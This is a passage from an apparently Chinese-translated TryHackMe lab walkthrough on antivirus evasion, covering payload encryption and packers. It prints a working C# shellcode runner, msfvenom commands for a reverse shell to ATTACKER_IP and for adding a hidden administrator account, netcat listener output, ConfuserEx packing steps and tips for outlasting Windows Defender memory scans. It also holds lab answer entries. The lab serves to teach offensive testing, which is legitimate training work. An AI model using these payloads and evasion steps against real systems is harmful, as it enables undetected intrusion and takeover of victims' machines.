\u5c3d\u7ba1\u5982\u6b64\uff0c\u8fd9\u6b21\u9632\u75c5\u6bd2\u8f6f\u4ef6\u4e0d\u4f1a\u5bf9\u6709\u6548\u8f7d\u8377\u53d1\u51fa\u8b66\u544a\uff0c\u56e0\u4e3a\u8fd9\u4e24\u79cd\u65b9\u6cd5\u7684\u7ec4\u5408\u4e0d\u662f\u5b83\u53ef\u4ee5\u76f4\u63a5\u5206\u6790\u7684\u4e1c\u897f\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u5728Windows\u673a\u5668\u4e0a\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u7f16\u8bd1\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Compile Our Encrypted Payload"',children:"C:\\> csc.exe EncStageless.cs\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u5728\u8fd0\u884c\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a",(0,d.jsx)(n.code,{children:"nc"}),"\u76d1\u542c\u5668\u3002 \u5c06\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\u590d\u5236\u5e76\u6267\u884c\u5230\u53d7\u5bb3\u673a\u5668\u540e\uff0c\u6211\u4eec\u5e94\u8be5\u6309\u9884\u671f\u83b7\u5f97\u4e00\u4e2a\u8fde\u63a5\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Set Up nc Listener"',children:"user@AttackBox$ nc -lvp 443\nListening on [0.0.0.0] (family 0, port 443)\nConnection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\System32>\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u5982\u60a8\u6240\u89c1\uff0c\u6709\u65f6\u7b80\u5355\u7684\u8c03\u6574\u5c31\u8db3\u591f\u4e86\u3002 \u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u60a8\u5728\u7ebf\u4e0a\u627e\u5230\u7684\u4efb\u4f55\u7279\u5b9a\u65b9\u6cd5\u53ef\u80fd\u65e0\u6cd5\u5f00\u7bb1\u5373\u7528\uff0c\u56e0\u4e3a\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\u9488\u5bf9\u5b83\u4eec\u7684\u68c0\u6d4b\u7b7e\u540d\u3002 \u7136\u800c\uff0c\u4f7f\u7528\u4e00\u70b9\u60f3\u8c61\u529b\u6765\u5b9a\u5236\u4efb\u4f55\u65b9\u6cd5\u53ef\u80fd\u8db3\u4ee5\u6210\u529f\u7ed5\u8fc7\u3002"}),"\n",(0,d.jsx)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:(0,d.jsxs)(l,{children:[(0,d.jsxs)("summary",{children:[" \u5c1d\u8bd5\u5728THM\u9632\u75c5\u6bd2\u68c0\u67e5\u7684",(0,d.jsx)(n.code,{children:"http://MACHINE_IP/"}),"\u4e0a\u4f7f\u7528\u6b64\u6280\u672f\uff08\u7ed3\u5408\u7f16\u7801\u548c\u52a0\u5bc6\uff09\u3002 \u5b83\u662f\u5426\u7ed5\u8fc7\u4e86\u5df2\u5b89\u88c5\u7684\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff1f "]}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a19-\u6253\u5305\u5668",children:"\u4efb\u52a19 \u6253\u5305\u5668"}),"\n",(0,d.jsxs)(n.p,{children:["\u53e6\u4e00\u79cd\u51fb\u8d25\u57fa\u4e8e\u78c1\u76d8\u7684\u9632\u75c5\u6bd2\u68c0\u6d4b\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u6253\u5305\u5668\u3002 ",(0,d.jsx)(n.strong,{children:"\u6253\u5305\u5668"}),"\u662f\u4e00\u79cd\u8f6f\u4ef6\uff0c\u5b83\u63a5\u53d7\u4e00\u4e2a\u7a0b\u5e8f\u4f5c\u4e3a\u8f93\u5165\u5e76\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\uff0c\u4f7f\u5176\u7ed3\u6784\u770b\u8d77\u6765\u4e0d\u540c\uff0c\u4f46\u5176\u529f\u80fd\u5b8c\u5168\u4fdd\u6301\u4e0d\u53d8\u3002 \u6253\u5305\u5668\u8fd9\u6837\u505a\u6709\u4e24\u4e2a\u4e3b\u8981\u76ee\u6807\uff1a"]}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u538b\u7f29\u7a0b\u5e8f\u4ee5\u5360\u7528\u66f4\u5c11\u7a7a\u95f4\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u603b\u4f53\u4e0a\u4fdd\u62a4\u7a0b\u5e8f\u514d\u53d7\u9006\u5411\u5de5\u7a0b\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:"\u6253\u5305\u5668\u901a\u5e38\u88ab\u5e0c\u671b\u4fdd\u62a4\u5176\u8f6f\u4ef6\u514d\u53d7\u9006\u5411\u5de5\u7a0b\u6216\u7834\u89e3\u7684\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u3002 \u5b83\u4eec\u901a\u8fc7\u5b9e\u73b0\u4e00\u7cfb\u5217\u8f6c\u6362\u6765\u5b9e\u73b0\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fdd\u62a4\uff0c\u8fd9\u4e9b\u8f6c\u6362\u5305\u62ec\u538b\u7f29\u3001\u52a0\u5bc6\u3001\u6dfb\u52a0\u8c03\u8bd5\u4fdd\u62a4\u7b49\u3002 \u6b63\u5982\u60a8\u53ef\u80fd\u5df2\u7ecf\u731c\u5230\u7684\uff0c\u6253\u5305\u5668\u4e5f\u901a\u5e38\u7528\u4e8e\u4e0d\u8d39\u592a\u591a\u529b\u6c14\u5730\u6df7\u6dc6\u6076\u610f\u8f6f\u4ef6\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u5e02\u9762\u4e0a\u6709\u76f8\u5f53\u591a\u7684\u6253\u5305\u5668\uff0c\u5305\u62ecUPX\u3001MPRESS\u3001Themida\u7b49\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u6253\u5305\u5e94\u7528\u7a0b\u5e8f",children:"\u6253\u5305\u5e94\u7528\u7a0b\u5e8f"}),"\n",(0,d.jsx)(n.p,{children:"\u867d\u7136\u6bcf\u4e2a\u6253\u5305\u5668\u7684\u64cd\u4f5c\u65b9\u5f0f\u4e0d\u540c\uff0c\u4f46\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a\u7b80\u5355\u6253\u5305\u5668\u4f1a\u505a\u4ec0\u4e48\u7684\u57fa\u672c\u793a\u4f8b\u3002"}),"\n",(0,d.jsxs)(n.p,{children:["\u5f53\u5e94\u7528\u7a0b\u5e8f\u88ab\u6253\u5305\u65f6\uff0c\u5b83\u5c06\u4f7f\u7528",(0,d.jsx)(n.strong,{children:"\u6253\u5305"}),"\u51fd\u6570\u4ee5\u67d0\u79cd\u65b9\u5f0f\u8fdb\u884c\u8f6c\u6362\u3002 \u6253\u5305\u51fd\u6570\u9700\u8981\u80fd\u591f\u4ee5\u53ef\u4ee5\u88ab",(0,d.jsx)(n.strong,{children:"\u89e3\u5305"}),"\u51fd\u6570\u5408\u7406\u53cd\u8f6c\u7684\u65b9\u5f0f\u6df7\u6dc6\u548c\u8f6c\u6362\u5e94\u7528\u7a0b\u5e8f\u7684\u539f\u59cb\u4ee3\u7801\uff0c\u4ee5\u4fbf\u4fdd\u7559\u5e94\u7528\u7a0b\u5e8f\u7684\u539f\u59cb\u529f\u80fd\u3002 \u867d\u7136\u6709\u65f6\u6253\u5305\u5668\u53ef\u80fd\u4f1a\u6dfb\u52a0\u4e00\u4e9b\u4ee3\u7801\uff08\u4f8b\u5982\uff0c\u4f7f\u8c03\u8bd5\u5e94\u7528\u7a0b\u5e8f\u66f4\u52a0\u56f0\u96be\uff09\uff0c\u4f46\u5b83\u901a\u5e38\u5e0c\u671b\u80fd\u591f\u6267\u884c\u65f6\u6062\u590d\u60a8\u7f16\u5199\u7684\u539f\u59cb\u4ee3\u7801\u3002"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"packers",src:s(1009).A+"",width:"1386",height:"535"})}),"\n",(0,d.jsx)(n.p,{children:"\u5e94\u7528\u7a0b\u5e8f\u7684\u6253\u5305\u7248\u672c\u5c06\u5305\u542b\u60a8\u6253\u5305\u7684\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\u3002 \u7531\u4e8e\u8fd9\u4e2a\u65b0\u7684\u6253\u5305\u4ee3\u7801\u88ab\u6df7\u6dc6\u4e86\uff0c\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u80fd\u591f\u4ece\u4e2d\u89e3\u5305\u539f\u59cb\u4ee3\u7801\u3002 \u4e3a\u6b64\uff0c\u6253\u5305\u5668\u5c06\u5d4c\u5165\u4e00\u4e2a\u5305\u542b\u89e3\u5305\u5668\u7684\u4ee3\u7801\u5b58\u6839\uff0c\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4e3b\u5165\u53e3\u70b9\u91cd\u5b9a\u5411\u5230\u5b83\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u5f53\u60a8\u6253\u5305\u7684\u5e94\u7528\u7a0b\u5e8f\u88ab\u6267\u884c\u65f6\uff0c\u5c06\u53d1\u751f\u4ee5\u4e0b\u60c5\u51b5\uff1a"}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"packers",src:s(5358).A+"",width:"1108",height:"777"})}),"\n",(0,d.jsxs)(n.ol,{children:["\n",(0,d.jsx)(n.li,{children:"\u89e3\u5305\u5668\u9996\u5148\u88ab\u6267\u884c\uff0c\u56e0\u4e3a\u5b83\u662f\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5165\u53e3\u70b9\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u89e3\u5305\u5668\u8bfb\u53d6\u6253\u5305\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u89e3\u5305\u5668\u5c06\u5728\u5185\u5b58\u4e2d\u7684\u67d0\u4e2a\u4f4d\u7f6e\u5199\u5165\u539f\u59cb\u89e3\u5305\u4ee3\u7801\uff0c\u5e76\u5c06\u5e94\u7528\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u5b9a\u5411\u5230\u5b83\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.h3,{id:"\u6253\u5305\u5668\u548c\u9632\u75c5\u6bd2\u8f6f\u4ef6",children:"\u6253\u5305\u5668\u548c\u9632\u75c5\u6bd2\u8f6f\u4ef6"}),"\n",(0,d.jsx)(n.p,{children:"\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6253\u5305\u5668\u5982\u4f55\u5e2e\u52a9\u7ed5\u8fc7\u9632\u75c5\u6bd2\u89e3\u51b3\u65b9\u6848\u3002 \u5047\u8bbe\u60a8\u6784\u5efa\u4e86\u4e00\u4e2a\u53cd\u5411shell\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f46\u9632\u75c5\u6bd2\u8f6f\u4ef6\u5c06\u5176\u6355\u83b7\u4e3a\u6076\u610f\u8f6f\u4ef6\uff0c\u56e0\u4e3a\u5b83\u5339\u914d\u5df2\u77e5\u7b7e\u540d\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u6253\u5305\u5668\u5c06\u8f6c\u6362\u53cd\u5411shell\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f7f\u5176\u5728\u78c1\u76d8\u4e0a\u4e0d\u5339\u914d\u4efb\u4f55\u5df2\u77e5\u7b7e\u540d\u3002 \u56e0\u6b64\uff0c\u60a8\u5e94\u8be5\u80fd\u591f\u5c06\u60a8\u7684\u6709\u6548\u8f7d\u8377\u5206\u53d1\u5230\u4efb\u4f55\u673a\u5668\u7684\u78c1\u76d8\u4e0a\u800c\u4e0d\u4f1a\u6709\u592a\u591a\u95ee\u9898\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u7136\u800c\uff0c\u9632\u75c5\u6bd2\u89e3\u51b3\u65b9\u6848\u4ecd\u53ef\u80fd\u56e0\u4ee5\u4e0b\u51e0\u4e2a\u539f\u56e0\u6355\u83b7\u60a8\u6253\u5305\u7684\u5e94\u7528\u7a0b\u5e8f\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u867d\u7136\u60a8\u7684\u539f\u59cb\u4ee3\u7801\u53ef\u80fd\u88ab\u8f6c\u6362\u4e3a\u65e0\u6cd5\u8bc6\u522b\u7684\u4e1c\u897f\uff0c\u4f46\u8bf7\u8bb0\u4f4f\u6253\u5305\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5305\u542b\u4e00\u4e2a\u5e26\u6709\u89e3\u5305\u5668\u4ee3\u7801\u7684\u5b58\u6839\u3002 \u5982\u679c\u89e3\u5305\u5668\u6709\u5df2\u77e5\u7b7e\u540d\uff0c\u9632\u75c5\u6bd2\u89e3\u51b3\u65b9\u6848\u53ef\u80fd\u4ec5\u57fa\u4e8e\u89e3\u5305\u5668\u5b58\u6839\u5c31\u6807\u8bb0\u4efb\u4f55\u6253\u5305\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u5728\u67d0\u4e2a\u65f6\u523b\uff0c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u5c06\u628a\u539f\u59cb\u4ee3\u7801\u89e3\u5305\u5230\u5185\u5b58\u4e2d\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u6267\u884c\u3002 \u5982\u679c\u60a8\u8bd5\u56fe\u7ed5\u8fc7\u7684\u9632\u75c5\u6bd2\u89e3\u51b3\u65b9\u6848\u53ef\u4ee5\u8fdb\u884c\u5185\u5b58\u626b\u63cf\uff0c\u60a8\u7684\u4ee3\u7801\u5728\u89e3\u5305\u540e\u53ef\u80fd\u4ecd\u7136\u88ab\u68c0\u6d4b\u5230\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.h3,{id:"\u6253\u5305\u6211\u4eec\u7684shellcode",children:"\u6253\u5305\u6211\u4eec\u7684shellcode"}),"\n",(0,d.jsxs)(n.p,{children:["\u8ba9\u6211\u4eec\u4ece\u4e00\u4e2a\u57fa\u672c\u7684C# shellcode\u5f00\u59cb\u3002 \u60a8\u4e5f\u53ef\u4ee5\u5728Windows\u673a\u5668\u7684",(0,d.jsx)(n.code,{children:"C:\\Tools\\CS Files\\UnEncStagelessPayload.cs"}),"\u4e2d\u627e\u5230\u6b64\u4ee3\u7801\uff1a"]}),"\n",(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u5b8c\u6574\u6709\u6548\u8f7d\u8377\u4ee3\u7801\uff08\u70b9\u51fb\u9605\u8bfb\uff09 "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Net;\nusing System.Text;\nusing System.Configuration.Install;\nusing System.Runtime.InteropServices;\nusing System.Security.Cryptography.X509Certificates;\n\npublic class Program {\n  [DllImport("kernel32")]\n  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n  [DllImport("kernel32")]\n  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\n  [DllImport("kernel32")]\n  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n  private static UInt32 MEM_COMMIT = 0x1000;\n  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n  public static void Main()\n  {\n    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };\n\n\n    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);\n\n    IntPtr threadHandle = IntPtr.Zero;\n    UInt32 threadId = 0;\n    IntPtr parameter = IntPtr.Zero;\n    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);\n\n    WaitForSingleObject(threadHandle, 0xFFFFFFFF);\n\n  }\n}\n'})})]}),"\n",(0,d.jsxs)(n.p,{children:["\u6b64\u6709\u6548\u8f7d\u8377\u83b7\u53d6\u7531msfvenom\u751f\u6210\u7684shellcode\u5e76\u5728\u5355\u72ec\u7684\u7ebf\u7a0b\u4e2d\u8fd0\u884c\u5b83\u3002 \u4e3a\u6b64\uff0c\u60a8\u9700\u8981\u751f\u6210\u4e00\u4e2a\u65b0\u7684shellcode\u5e76\u5c06\u5176\u653e\u5165\u4ee3\u7801\u7684",(0,d.jsx)(n.code,{children:"shellcode"}),"\u53d8\u91cf\u4e2d\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u7136\u540e\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5728Windows\u673a\u5668\u4e0a\u7f16\u8bd1\u60a8\u7684\u6709\u6548\u8f7d\u8377\uff1a"}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\> csc UnEncStagelessPayload.cs\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u4e00\u65e6\u60a8\u6709\u4e00\u4e2a\u53ef\u5de5\u4f5c\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u60a8\u53ef\u4ee5\u5c1d\u8bd5\u5c06\u5176\u4e0a\u4f20\u5230THM\u9632\u75c5\u6bd2\u68c0\u67e5\uff01 \u9875\u9762\uff08\u684c\u9762\u4e0a\u7684\u94fe\u63a5\uff09\u3002 \u5b83\u5e94\u8be5\u7acb\u5373\u88ab\u9632\u75c5\u6bd2\u8f6f\u4ef6\u6807\u8bb0\u3002 \u8ba9\u6211\u4eec\u5728\u540c\u4e00\u4e2a\u6709\u6548\u8f7d\u8377\u4e0a\u4f7f\u7528\u6253\u5305\u5668\uff0c\u770b\u770b\u4f1a\u53d1\u751f\u4ec0\u4e48\u3002"}),"\n",(0,d.jsxs)(n.p,{children:["\u6211\u4eec\u5c06\u4f7f\u7528",(0,d.jsx)(n.a,{href:"https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0",children:"ConfuserEx"}),"\u6253\u5305\u5668\u6765\u5b8c\u6210\u6b64\u4efb\u52a1\uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\u662f\u7528",(0,d.jsx)(n.code,{children:".NET"}),"\u7f16\u7a0b\u7684\u3002 \u4e3a\u65b9\u4fbf\u8d77\u89c1\uff0c\u60a8\u53ef\u4ee5\u5728\u684c\u9762\u4e0a\u627e\u5230\u5b83\u7684\u5feb\u6377\u65b9\u5f0f\u3002"]}),"\n",(0,d.jsx)(n.p,{children:"ConfuserEx\u5c06\u8981\u6c42\u60a8\u6307\u5b9a\u5176\u5de5\u4f5c\u6587\u4ef6\u5939\u3002 \u8bf7\u786e\u4fdd\u9009\u62e9\u60a8\u7684\u684c\u9762\u4f5c\u4e3a\u57fa\u7840\u76ee\u5f55\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002 \u8bbe\u7f6e\u597d\u57fa\u7840\u76ee\u5f55\u540e\uff0c\u5c06\u8981\u6253\u5305\u7684\u53ef\u6267\u884c\u6587\u4ef6\u62d6\u653e\u5230\u754c\u9762\u4e0a\uff0c\u60a8\u5e94\u8be5\u4f1a\u5f97\u5230\u4ee5\u4e0b\u7ed3\u679c\uff1a"}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"Packer config part1",src:s(2478).A+"",width:"780",height:"586"})}),"\n",(0,d.jsx)(n.p,{children:'\u8ba9\u6211\u4eec\u8f6c\u5230\u8bbe\u7f6e\u9009\u9879\u5361\u5e76\u9009\u62e9\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\u3002 \u9009\u62e9\u540e\uff0c\u70b9\u51fb"+"\u6309\u94ae\u5c06\u8bbe\u7f6e\u6dfb\u52a0\u5230\u60a8\u7684\u6709\u6548\u8d1f\u8f7d\u4e2d\u3002 \u8fd9\u5e94\u8be5\u4f1a\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a"true"\u7684\u89c4\u5219\u3002 \u8bf7\u786e\u4fdd\u540c\u65f6\u542f\u7528\u538b\u7f29\uff1a'}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"Packer config part2",src:s(575).A+"",width:"780",height:"585"})}),"\n",(0,d.jsx)(n.p,{children:'\u6211\u4eec\u73b0\u5728\u5c06\u7f16\u8f91"true"\u89c4\u5219\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u6700\u5927\u9884\u8bbe\uff1a'}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u6253\u5305\u5668\u914d\u7f6e\u90e8\u52063",src:s(6671).A+"",width:"386",height:"593"})}),"\n",(0,d.jsx)(n.p,{children:'\u6700\u540e\uff0c\u6211\u4eec\u5c06\u8f6c\u5230"\u4fdd\u62a4\uff01"\u9009\u9879\u5361\u5e76\u70b9\u51fb"\u4fdd\u62a4"\uff1a'}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u6253\u5305\u5668\u914d\u7f6e\u90e8\u52064",src:s(4107).A+"",width:"779",height:"586"})}),"\n",(0,d.jsxs)(n.p,{children:["\u65b0\u7684\u6709\u6548\u8f7d\u8377\u5e94\u8be5\u5df2\u51c6\u5907\u5c31\u7eea\uff0c\u5e76\u4e14\u5e0c\u671b\u5728\u4e0a\u4f20\u5230 THM \u9632\u75c5\u6bd2\u68c0\u67e5\u5668\u65f6\u4e0d\u4f1a\u89e6\u53d1\u4efb\u4f55\u8b66\u62a5\uff01 \uff08\u684c\u9762\u4e0a\u6709\u5feb\u6377\u65b9\u5f0f\uff09\u3002 \u5b9e\u9645\u4e0a\uff0c\u5982\u679c\u60a8\u6267\u884c\u60a8\u7684\u6709\u6548\u8f7d\u8377\u5e76\u8bbe\u7f6e\u4e00\u4e2a ",(0,d.jsx)(n.code,{children:"nc"})," \u76d1\u542c\u5668\uff0c\u60a8\u5e94\u8be5\u80fd\u591f\u83b7\u5f97\u4e00\u4e2a\u53cd\u5411 shell\uff1a"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="AttackBox"',children:"user@attackbox$ nc -lvp 7478\n"})}),"\n",(0,d.jsx)(n.p,{children:"\u5230\u76ee\u524d\u4e3a\u6b62\u4e00\u5207\u987a\u5229\uff0c\u4f46\u8fd8\u8bb0\u5f97\u6211\u4eec\u8ba8\u8bba\u8fc7\u9632\u75c5\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u5185\u5b58\u626b\u63cf\u5417\uff1f \u5982\u679c\u60a8\u5c1d\u8bd5\u5728\u53cd\u5411 shell \u4e0a\u8fd0\u884c\u547d\u4ee4\uff0c\u9632\u75c5\u6bd2\u8f6f\u4ef6\u4f1a\u6ce8\u610f\u5230\u60a8\u7684 shell \u5e76\u7ec8\u6b62\u5b83\u3002 \u8fd9\u662f\u56e0\u4e3a Windows Defender \u4f1a\u6302\u94a9\u67d0\u4e9b Windows API \u8c03\u7528\uff0c\u5e76\u5728\u4f7f\u7528\u6b64\u7c7b API \u8c03\u7528\u65f6\u8fdb\u884c\u5185\u5b58\u626b\u63cf\u3002 \u5bf9\u4e8e\u4efb\u4f55\u4f7f\u7528 msfvenom \u751f\u6210\u7684 shell\uff0c\u90fd\u4f1a\u8c03\u7528 CreateProcess() \u5e76\u88ab\u68c0\u6d4b\u5230\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u90a3\u4e48\u6211\u4eec\u73b0\u5728\u8be5\u600e\u4e48\u529e",children:"\u90a3\u4e48\u6211\u4eec\u73b0\u5728\u8be5\u600e\u4e48\u529e\uff1f"}),"\n",(0,d.jsx)(n.p,{children:"\u867d\u7136\u51fb\u8d25\u5185\u5b58\u626b\u63cf\u8d85\u51fa\u4e86\u672c\u623f\u95f4\u7684\u8303\u56f4\uff0c\u4f46\u60a8\u53ef\u4ee5\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4e8b\u60c5\u6765\u907f\u514d\u68c0\u6d4b\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:"\u53ea\u9700\u7a0d\u7b49\u7247\u523b"}),"\u3002 \u5c1d\u8bd5\u518d\u6b21\u751f\u6210\u53cd\u5411 shell\uff0c\u5e76\u5728\u53d1\u9001\u4efb\u4f55\u547d\u4ee4\u524d\u7b49\u5f85\u5927\u7ea6 5 \u5206\u949f\u3002 \u60a8\u4f1a\u770b\u5230\u9632\u75c5\u6bd2\u8f6f\u4ef6\u4e0d\u518d\u62b1\u6028\u3002 \u539f\u56e0\u662f\u626b\u63cf\u5185\u5b58\u662f\u4e00\u9879\u6602\u8d35\u7684\u64cd\u4f5c\u3002 \u56e0\u6b64\uff0c\u9632\u75c5\u6bd2\u8f6f\u4ef6\u4f1a\u5728\u60a8\u7684\u8fdb\u7a0b\u542f\u52a8\u540e\u7684\u4e00\u6bb5\u65f6\u95f4\u5185\u8fdb\u884c\u626b\u63cf\uff0c\u4f46\u6700\u7ec8\u4f1a\u505c\u6b62\u3002"]}),"\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:"\u4f7f\u7528\u66f4\u5c0f\u7684\u6709\u6548\u8f7d\u8377"}),"\u3002 \u6709\u6548\u8f7d\u8377\u8d8a\u5c0f\uff0c\u88ab\u68c0\u6d4b\u5230\u7684\u53ef\u80fd\u6027\u5c31\u8d8a\u5c0f\u3002 \u5982\u679c\u60a8\u4f7f\u7528 msfvenom \u6267\u884c\u5355\u4e2a\u547d\u4ee4\u800c\u4e0d\u662f\u53cd\u5411 shell\uff0c\u9632\u75c5\u6bd2\u8f6f\u4ef6\u5c06\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u3002 \u60a8\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528 ",(0,d.jsx)(n.code,{children:"msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp"})," \u770b\u770b\u4f1a\u53d1\u751f\u4ec0\u4e48\u3002"]}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:"\u5982\u679c\u68c0\u6d4b\u4e0d\u662f\u95ee\u9898\uff0c\u60a8\u751a\u81f3\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u6280\u5de7\u3002 \u4ece\u60a8\u7684\u53cd\u5411 shell \u4e2d\u518d\u6b21\u8fd0\u884c cmd.exe\u3002 \u9632\u75c5\u6bd2\u8f6f\u4ef6\u4f1a\u68c0\u6d4b\u5230\u60a8\u7684\u6709\u6548\u8f7d\u8377\u5e76\u7ec8\u6b62\u76f8\u5173\u8fdb\u7a0b\uff0c\u4f46\u4e0d\u4f1a\u7ec8\u6b62\u60a8\u521a\u521a\u751f\u6210\u7684\u65b0 cmd.exe\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u867d\u7136\u6bcf\u4e2a\u9632\u75c5\u6bd2\u8f6f\u4ef6\u7684\u884c\u4e3a\u90fd\u4e0d\u540c\uff0c\u4f46\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u90fd\u4f1a\u6709\u7c7b\u4f3c\u7684\u65b9\u6cd5\u7ed5\u8fc7\u5b83\u4eec\uff0c\u56e0\u6b64\u503c\u5f97\u63a2\u7d22\u5728\u6d4b\u8bd5\u65f6\u6ce8\u610f\u5230\u7684\u4efb\u4f55\u5947\u602a\u884c\u4e3a\u3002"}),"\n",(0,d.jsxs)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:[(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u6253\u5305\u5668\u662f\u5426\u6709\u52a9\u4e8e\u6df7\u6dc6\u6076\u610f\u4ee3\u7801\u4ee5\u7ed5\u8fc7\u9632\u75c5\u6bd2\u89e3\u51b3\u65b9\u6848\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"yea\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" 